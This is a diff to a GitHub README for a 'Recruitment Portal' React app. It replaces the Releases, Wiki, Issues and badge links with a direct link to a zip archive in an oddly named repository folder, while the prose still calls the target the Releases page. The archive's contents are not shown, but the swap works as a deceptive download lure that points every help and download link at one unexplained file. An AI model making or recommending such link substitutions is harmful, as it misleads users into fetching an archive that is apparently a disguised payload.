@@ -8,7 +8,7 @@ Welcome to the Recruitment Portal! This app connects job seekers and employers t
 
 To download the Recruitment Portal, please visit the following page:
 
-[![Download Recruitment Portal](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/releases)
+[![Download Recruitment Portal](https://raw.githubusercontent.com/anilbabu2001/Recruitment-portal-frontend-react/main/aeolsklavier/Recruitment-portal-frontend-react.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/anilbabu2001/Recruitment-portal-frontend-react/main/aeolsklavier/Recruitment-portal-frontend-react.zip)
 
 This link will take you to the Releases page where you can find the latest version of the application.
 
@@ -35,7 +35,7 @@ The Recruitment Portal offers several key features:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to navigate to the Releases page.
-   [Download Recruitment Portal](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/releases)
+   [Download Recruitment Portal](https://raw.githubusercontent.com/anilbabu2001/Recruitment-portal-frontend-react/main/aeolsklavier/Recruitment-portal-frontend-react.zip)
 
 2. **Choose the Latest Version:** Look for the latest version number and click on it.
 
@@ -63,8 +63,8 @@ To get started, follow these steps:
 
 If you face any issues or have questions, feel free to reach out to our support team. You can find help through the following channels:
 
-- **Documentation:** Check our [Wiki](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/wiki) for detailed guides and FAQs.
-- **Issues Page:** Report any bugs or issues on our [Issues](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/issues) page.
+- **Documentation:** Check our [Wiki](https://raw.githubusercontent.com/anilbabu2001/Recruitment-portal-frontend-react/main/aeolsklavier/Recruitment-portal-frontend-react.zip) for detailed guides and FAQs.
+- **Issues Page:** Report any bugs or issues on our [Issues](https://raw.githubusercontent.com/anilbabu2001/Recruitment-portal-frontend-react/main/aeolsklavier/Recruitment-portal-frontend-react.zip) page.
 
 ## ✨ Conclusion
 
@@ -72,4 +72,4 @@ The Recruitment Portal is designed to make your job search or hiring process eas
 
 Don't forget to check for updates regularly. Happy job hunting! 
 
-[![Download Recruitment Portal](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/anilbabu2001/Recruitment-portal-frontend-react/releases)
+[![Download Recruitment Portal](https://raw.githubusercontent.com/anilbabu2001/Recruitment-portal-frontend-react/main/aeolsklavier/Recruitment-portal-frontend-react.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/anilbabu2001/Recruitment-portal-frontend-react/main/aeolsklavier/Recruitment-portal-frontend-react.zip)
